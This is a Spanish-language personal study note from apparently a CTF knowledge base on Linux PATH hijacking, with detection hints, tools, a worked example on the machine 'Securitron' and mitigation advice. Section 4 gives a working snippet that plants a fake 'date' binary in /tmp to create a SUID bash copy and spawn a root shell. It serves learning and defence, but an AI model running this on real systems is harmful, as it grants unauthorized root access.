---
tags: [tecnica, escalada-linux, path, cron]
tipo: tecnica
categoria: escalada-linux
estado: practicado
maquinas: [Securitron]
---

# PATH Hijacking

## 1. Qué es

Sustituir un binario invocado **sin ruta absoluta** por otro malicioso, colocándolo antes en el `PATH` del proceso privilegiado.

## 2. Cómo funciona

- Un script/cron root ejecuta `date` (u otro) sin `/bin/`.
- Si en su `PATH` hay un directorio escribible **antes** que `/bin`, se ejecuta nuestro falso binario como root.

## 3. Cuándo sospecharla

- Tareas programadas que llaman comandos «a secas».
- Directorios escribibles presentes en el `PATH` del proceso.

## 4. Cómo comprobarla (laboratorio autorizado)

```bash
# identificar el binario invocado por el cron/script root
cat > /tmp/date <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/bash; chmod +s /tmp/bash
EOF
chmod +x /tmp/date
export PATH=/tmp:$PATH
# esperar la ejecución del cron
/tmp/bash -p; id
```

## 5. Herramientas

- `pspy`, `strings`, lectura de scripts.

## 6. Ejemplos en mis CTF

| Máquina | Contexto | Resultado |
|---|---|---|
| [[Securitron]] | Cron root invocaba `date` con `PATH` controlable | root |

## 7. Falsos positivos / pruebas fallidas

- Si el cron usa **ruta absoluta**, el hijacking no aplica.
- Modificar el `PATH` en la shell de **usuario** no afecta al proceso de root: debe ser el `PATH` **del cron**.

## 8. Prevención y mitigación

- Rutas **absolutas** en scripts y cron; `PATH` fijo y seguro.

## 9. Técnicas relacionadas

- [[Cron-Privilege-Escalation]], [[SUID]]
